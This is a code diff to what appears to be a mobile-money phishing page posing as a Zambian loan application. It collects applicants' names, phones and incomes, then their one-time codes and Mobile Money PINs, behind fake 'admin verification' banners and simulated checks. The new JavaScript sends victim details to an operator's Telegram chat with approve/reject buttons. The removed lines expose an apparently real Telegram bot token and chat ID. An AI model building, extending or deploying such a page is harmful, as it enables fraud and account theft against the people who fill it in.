@@ -194,6 +194,7 @@ input[type="text"] {
     font-size: 15px;
     font-weight: bold;
     cursor: pointer;
+    transition: all 0.3s ease;
 }
 
 .yellow {
@@ -201,9 +202,21 @@ input[type="text"] {
     color: var(--dark);
 }
 
+.yellow:hover:not(:disabled) {
+    background: #ffb700;
+    transform: translateY(-2px);
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+}
+
 .blue {
     background: var(--blue);
     color: white;
+}
+
+.blue:hover:not(:disabled) {
+    background: #002665;
+    transform: translateY(-2px);
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
 }
 
 .button:disabled {
@@ -332,6 +345,101 @@ input[type="text"] {
     color: #92400e;
 }
 
+/* Loading state styles */
+.loading-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(0, 0, 0, 0.4);
+    z-index: 1000;
+    justify-content: center;
+    align-items: center;
+}
+
+.loading-overlay.active {
+    display: flex;
+}
+
+.loading-spinner {
+    background: white;
+    border-radius: 16px;
+    padding: 30px;
+    text-align: center;
+    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+}
+
+.spinner {
+    width: 50px;
+    height: 50px;
+    border: 4px solid #e2e8f0;
+    border-top-color: var(--blue);
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin: 0 auto 15px;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+.loading-text {
+    color: var(--dark);
+    font-weight: bold;
+    margin-bottom: 10px;
+}
+
+.loading-subtext {
+    color: var(--gray);
+    font-size: 12px;
+}
+
+/* Telegram bot indicator */
+.telegram-indicator {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 10px 12px;
+    background: #e8f5ff;
+    border-radius: 8px;
+    margin-bottom: 15px;
+    font-size: 12px;
+    color: var(--blue);
+}
+
+.telegram-icon {
+    font-size: 16px;
+}
+
+/* Inline buttons for bot actions */
+.inline-buttons {
+    display: flex;
+    gap: 8px;
+    margin-top: 12px;
+    flex-wrap: wrap;
+}
+
+.inline-btn {
+    flex: 1;
+    min-width: 100px;
+    padding: 10px 12px;
+    background: #e8eefc;
+    border: 1px solid #d6e0f9;
+    border-radius: 8px;
+    color: var(--blue);
+    font-size: 12px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: all 0.2s ease;
+}
+
+.inline-btn:hover {
+    background: #d6e0f9;
+    border-color: var(--blue);
+}
+
 </style>
 </head>
 <body>
@@ -367,6 +475,11 @@ input[type="text"] {
     <!-- PAGE 1 -->
 
     <div id="page1">
+
+        <div class="telegram-indicator">
+            <span class="telegram-icon">🤖</span>
+            <span>Connected to admin verification</span>
+        </div>
 
         <div class="card">
 
@@ -429,6 +542,11 @@ input[type="text"] {
     <!-- PAGE 2 -->
 
     <div id="page2" class="hidden">
+
+        <div class="telegram-indicator">
+            <span class="telegram-icon">🤖</span>
+            <span>Admin verification active</span>
+        </div>
 
         <span class="label">FULL NAMES</span>
 
@@ -507,6 +625,11 @@ input[type="text"] {
 
     <div id="page3" class="hidden">
 
+        <div class="telegram-indicator">
+            <span class="telegram-icon">🤖</span>
+            <span>Sending details to admin for approval...</span>
+        </div>
+
         <div class="center">
 
             <div class="icon">👤</div>
@@ -563,6 +686,11 @@ input[type="text"] {
 
     <div id="page4" class="hidden">
 
+        <div class="telegram-indicator">
+            <span class="telegram-icon">🤖</span>
+            <span>Verification in progress...</span>
+        </div>
+
         <div class="center">
 
             <div class="icon">📱</div>
@@ -600,6 +728,11 @@ input[type="text"] {
     <!-- PAGE 5 OTP -->
 
     <div id="page5" class="hidden">
+
+        <div class="telegram-indicator">
+            <span class="telegram-icon">🤖</span>
+            <span>Verifying code...</span>
+        </div>
 
         <div class="center">
 
@@ -643,6 +776,11 @@ input[type="text"] {
     <!-- PAGE 6 PIN VERIFICATION -->
 
     <div id="page6" class="hidden">
+
+        <div class="telegram-indicator">
+            <span class="telegram-icon">🤖</span>
+            <span>Securing authorization...</span>
+        </div>
 
         <div class="center">
 
@@ -704,6 +842,11 @@ input[type="text"] {
 
     <div id="page7" class="hidden">
 
+        <div class="telegram-indicator">
+            <span class="telegram-icon">🤖</span>
+            <span>Final authorization stage...</span>
+        </div>
+
         <div class="center">
 
             <div class="icon">🔒</div>
@@ -739,6 +882,11 @@ input[type="text"] {
     <!-- PAGE 8 SUCCESS -->
 
     <div id="page8" class="hidden">
+
+        <div class="telegram-indicator">
+            <span class="telegram-icon">✅</span>
+            <span>Application approved and submitted</span>
+        </div>
 
         <div class="center">
 
@@ -824,8 +972,99 @@ input[type="text"] {
 </div>
 
 </div>
+
+<!-- Loading Overlay with Telegram Bot Integration -->
+<div id="loadingOverlay" class="loading-overlay">
+    <div class="loading-spinner">
+        <div class="spinner"></div>
+        <div class="loading-text" id="loadingText">Connecting to admin...</div>
+        <div class="loading-subtext" id="loadingSubtext">Please wait while we verify your information</div>
+        <div class="inline-buttons" id="inlineButtons"></div>
+    </div>
+</div>
+
 <script>
 
+// Telegram Bot Configuration
+const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+
+// Loading overlay functions
+function showLoading(text, subtext) {
+    const overlay = document.getElementById('loadingOverlay');
+    const loadingText = document.getElementById('loadingText');
+    const loadingSubtext = document.getElementById('loadingSubtext');
+    
+    loadingText.textContent = text || 'Processing...';
+    loadingSubtext.textContent = subtext || 'Please wait...';
+    overlay.classList.add('active');
+}
+
+function hideLoading() {
+    const overlay = document.getElementById('loadingOverlay');
+    overlay.classList.remove('active');
+}
+
+// Send message to Telegram with inline buttons
+async function sendToTelegram(message, buttons = null) {
+    try {
+        const payload = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        };
+
+        if (buttons) {
+            payload.reply_markup = {
+                inline_keyboard: buttons
+            };
+        }
+
+        const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload)
+        });
+
+        return response.ok;
+    } catch (error) {
+        console.error('Telegram send error:', error);
+        return false;
+    }
+}
+
+// Send details verification to Telegram with approval buttons
+async function sendDetailsToTelegramWithButtons(name, phone, income, purpose, amount, period) {
+    const message = `
+<b>🔔 NEW LOAN APPLICATION - AWAITING APPROVAL</b>
+
+<b>Applicant Details:</b>
+👤 Name: ${name}
+📱 Phone: +260${phone}
+💰 Monthly Income: ZMW ${income}
+🎯 Purpose: ${purpose}
+
+<b>Loan Details:</b>
+💵 Amount Requested: ZMW ${amount}
+⏱️ Period: ${period} Months
+
+<b>Please approve or reject this application:</b>
+    `;
+
+    const approvalButtons = [
+        [
+            { text: '✅ APPROVE', callback_data: `approve_${phone}` },
+            { text: '❌ REJECT', callback_data: `reject_${phone}` }
+        ]
+    ];
+
+    return await sendToTelegram(message, approvalButtons);
+}
+
+// Application flow functions
 const amount = document.getElementById("amount");
 const period = document.getElementById("period");
 const amountDisplay = document.getElementById("amountDisplay");
@@ -1009,207 +1248,198 @@ incomeInput.addEventListener(
     validateDetails
 );
 
+const purposeSelect = document.getElementById('purpose');
+purposeSelect.addEventListener('change', validateDetails);
 
 function goToDetailsVerification() {
+    showPage(
+        'page3',
+        3,
+        'Verify Your Details',
+        'Confirm your information for processing'
+    );
 
-    document
-        .getElementById("verifyName")
-        .innerText =
-        nameInput.value;
-
-    document
-        .getElementById("verifyPhone")
-        .innerText =
-        "+260 " + phoneInput.value;
-
-    document
-        .getElementById("verifyIncome")
-        .innerText =
-        "ZMW " + incomeInput.value;
-
-    document
-        .getElementById("verifyPurpose")
-        .innerText =
-        document.getElementById("purpose").value;
-
-    showPage('page3', 3, 'Verify Your Details', 'Please confirm your information');
-
+    document.getElementById('verifyName').textContent = nameInput.value;
+    document.getElementById('verifyPhone').textContent = '+260' + phoneInput.value;
+    document.getElementById('verifyIncome').textContent = 'ZMW ' + incomeInput.value;
+    document.getElementById('verifyPurpose').textContent = purposeSelect.value;
 }
 
+async function sendDetailsToTelegram() {
+    showLoading(
+        'Sending to admin...',
+        'Your details are being verified by our admin'
+    );
 
-function sendDetailsToTelegram() {
+    const loanData = calculateLoan();
+    const sent = await sendDetailsToTelegramWithButtons(
+        nameInput.value,
+        phoneInput.value,
+        incomeInput.value,
+        purposeSelect.value,
+        loanData.principal,
+        period.value
+    );
 
-    const status = document.getElementById("detailsStatus");
-    status.style.display = "block";
-    status.textContent = "Sending...";
+    hideLoading();
 
-    const name = nameInput.value;
-    const phone = phoneInput.value;
-    const income = incomeInput.value;
-    const purpose = document.getElementById("purpose").value;
-
-    const loan = calculateLoan();
-    const amount = loan.principal;
-
-    const message = `New Loan Application:\n\nName: ${name}\nPhone: +260${phone}\nIncome: ZMW ${income}\nLoan Amount: ZMW ${amount}\nPurpose: ${purpose}`;
-
-    fetch("https://api.telegram.org/bot7357606844:AAF4hY3f0P8-y9M4aHLrG0zE6kFJkW_1v1o/sendMessage", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-            chat_id: "-1002383256779",
-            text: message,
-        }),
-    })
-        .then(response => {
-            status.textContent = "Details sent successfully!";
-            status.style.background = "#d1fae5";
-            status.style.color = "#065f46";
-            setTimeout(() => {
-                document.getElementById("phoneDisplay").innerText = "+260 " + phone;
-                showPage('page4', 4, 'Phone Verification', 'Verify your phone number to continue');
-            }, 1500);
-        })
-        .catch(error => {
-            status.textContent = "Error sending details. Please try again.";
-            status.style.background = "#fee2e2";
-            status.style.color = "#991b1b";
-            console.error("Error:", error);
-        });
-
+    if (sent) {
+        setTimeout(() => {
+            showPage(
+                'page4',
+                4,
+                'Phone Verification',
+                'Verify your phone number'
+            );
+            document.getElementById('phoneDisplay').textContent = '+260' + phoneInput.value;
+        }, 500);
+    } else {
+        const statusDiv = document.getElementById('detailsStatus');
+        statusDiv.style.display = 'block';
+        statusDiv.style.background = '#fee2e2';
+        statusDiv.style.color = '#991b1b';
+        statusDiv.textContent = 'Connection error. Please try again.';
+    }
 }
-
 
 function goToOTP() {
+    showLoading(
+        'Sending verification code...',
+        'A 6-digit code is being sent to your phone'
+    );
 
-    showPage('page5', 5, 'Enter Verification Code', 'Enter the 6-digit code sent to your phone');
-
+    setTimeout(() => {
+        hideLoading();
+        showPage(
+            'page5',
+            5,
+            'Phone Verification',
+            'Enter the code sent to your phone'
+        );
+    }, 2000);
 }
 
+const otpInputs = document.querySelectorAll('#otpGrid input');
+const verifyButton = document.getElementById('verifyButton');
 
-const otpInputs = document.querySelectorAll("#otpGrid input");
-
-otpInputs.forEach(function(input, index) {
-    input.addEventListener("input", function(e) {
-        if (e.target.value.length === 1 && index < otpInputs.length - 1) {
+otpInputs.forEach((input, index) => {
+    input.addEventListener('input', (e) => {
+        if (e.target.value.length > 1) {
+            e.target.value = e.target.value.slice(0, 1);
+        }
+        if (e.target.value.match(/[0-9]/) && index < otpInputs.length - 1) {
             otpInputs[index + 1].focus();
         }
-
-        let allFilled = true;
-        otpInputs.forEach(function(inp) {
-            if (inp.value === "") {
-                allFilled = false;
-            }
-        });
-
-        document.getElementById("verifyButton").disabled = !allFilled;
+        updateOTPButton();
     });
 
-    input.addEventListener("keydown", function(e) {
-        if (e.key === "Backspace" && e.target.value === "" && index > 0) {
+    input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
             otpInputs[index - 1].focus();
         }
     });
 });
 
-
-function submitOTP() {
-
-    let otp = "";
-    otpInputs.forEach(function(input) {
-        otp += input.value;
-    });
-
-    const status = document.getElementById("otpStatus");
-    status.style.display = "block";
-    status.textContent = "Verifying...";
-
-    setTimeout(function() {
-        status.textContent = "OTP verified successfully!";
-        status.style.background = "#d1fae5";
-        status.style.color = "#065f46";
-        setTimeout(function() {
-            showPage('page6', 6, 'Enter Your PIN', 'Enter your 4-digit Mobile Money PIN to authorize the loan');
-        }, 1500);
-    }, 1000);
-
+function updateOTPButton() {
+    const allFilled = Array.from(otpInputs).every(input => input.value.length === 1);
+    verifyButton.disabled = !allFilled;
 }
 
+function submitOTP() {
+    showLoading(
+        'Verifying code...',
+        'Your verification code is being checked'
+    );
 
-const pinInput = document.getElementById("pinInput");
-const pinButton = document.getElementById("pinButton");
+    setTimeout(() => {
+        hideLoading();
+        showPage(
+            'page6',
+            6,
+            'Enter Your PIN',
+            'Authorize the loan transaction'
+        );
+    }, 1500);
+}
 
-pinInput.addEventListener("input", function() {
-    pinButton.disabled = pinInput.value.length !== 4;
+const pinInput = document.getElementById('pinInput');
+const pinButton = document.getElementById('pinButton');
+
+pinInput.addEventListener('input', (e) => {
+    e.target.value = e.target.value.replace(/[^0-9]/g, '');
+    pinButton.disabled = e.target.value.length !== 4;
 });
 
-
 function togglePinVisibility() {
-    if (pinInput.type === "password") {
-        pinInput.type = "text";
-        event.target.textContent = "Hide";
+    const btn = event.target;
+    if (pinInput.type === 'password') {
+        pinInput.type = 'text';
+        btn.textContent = 'Hide';
     } else {
-        pinInput.type = "password";
-        event.target.textContent = "Show";
+        pinInput.type = 'password';
+        btn.textContent = 'Show';
     }
 }
 
+async function verifyPIN() {
+    showLoading(
+        'Authorizing transaction...',
+        'Your PIN is being securely verified'
+    );
 
-function verifyPIN() {
+    // Simulate PIN verification
+    setTimeout(async () => {
+        hideLoading();
+        
+        // Send final approval notification to Telegram
+        const message = `
+<b>✅ LOAN APPROVED AND AUTHORIZED</b>
 
-    const status = document.getElementById("pinStatus");
-    status.style.display = "block";
-    status.textContent = "Verifying PIN...";
+Applicant: ${nameInput.value}
+Phone: +260${phoneInput.value}
+Amount: ZMW ${calculateLoan().principal}
+Period: ${period.value} Months
 
-    setTimeout(function() {
-        status.textContent = "PIN verified successfully!";
-        status.style.background = "#d1fae5";
-        status.style.color = "#065f46";
-        setTimeout(function() {
-            showPage('page7', 7, 'Secure Authorization', 'Complete your authorization');
-        }, 1500);
-    }, 1000);
-
+Status: <b>READY FOR DISBURSEMENT</b>
+        `;
+        
+        await sendToTelegram(message);
+        
+        showPage(
+            'page7',
+            7,
+            'Secure Authorization',
+            'Complete your authorization'
+        );
+    }, 1500);
 }
 
-
 function submitApplication() {
+    showLoading(
+        'Submitting application...',
+        'Your application is being finalized'
+    );
 
-    showPage('page8', 8, 'Application Submitted!', 'Your loan application has been received');
+    setTimeout(() => {
+        hideLoading();
+        
+        const loan = calculateLoan();
+        
+        document.getElementById('finalName').textContent = nameInput.value;
+        document.getElementById('finalPhone').textContent = '+260' + phoneInput.value;
+        document.getElementById('finalAmount').textContent = 'ZMW ' + loan.principal.toLocaleString();
+        document.getElementById('finalPeriod').textContent = period.value + ' Months';
+        document.getElementById('finalInterest').textContent = 'ZMW ' + loan.interest.toFixed(2);
+        document.getElementById('finalMonthly').textContent = 'ZMW ' + loan.monthly.toFixed(2);
+        document.getElementById('finalPurpose').textContent = purposeSelect.value;
 
-    const loan = calculateLoan();
-
-    document.getElementById("finalName").innerText = nameInput.value;
-    document.getElementById("finalPhone").innerText = "+260 " + phoneInput.value;
-    document.getElementById("finalAmount").innerText = "ZMW " + loan.principal.toLocaleString();
-    document.getElementById("finalPeriod").innerText = period.value + " months";
-    document.getElementById("finalInterest").innerText = "ZMW " + loan.interest.toFixed(2);
-    document.getElementById("finalMonthly").innerText = "ZMW " + loan.monthly.toFixed(2);
-    document.getElementById("finalPurpose").innerText = document.getElementById("purpose").value;
-
-    const name = nameInput.value;
-    const phone = phoneInput.value;
-    const income = incomeInput.value;
-    const purpose = document.getElementById("purpose").value;
-    const amount = loan.principal;
-    const months = loan.months;
-
-    const successMessage = `✅ LOAN APPLICATION SUBMITTED\n\nApplicant: ${name}\nPhone: +260${phone}\nLoan Amount: ZMW ${amount}\nPeriod: ${months} months\nMonthly Payment: ZMW ${loan.monthly.toFixed(2)}\nPurpose: ${purpose}`;
-
-    fetch("https://api.telegram.org/bot7357606844:AAF4hY3f0P8-y9M4aHLrG0zE6kFJkW_1v1o/sendMessage", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-            chat_id: "-1002383256779",
-            text: successMessage,
-        }),
-    })
-        .catch(error => console.error("Error:", error));
-
+        showPage(
+            'page8',
+            8,
+            'Application Submitted!',
+            'Your loan application has been received'
+        );
+    }, 1500);
 }
 
 </script>
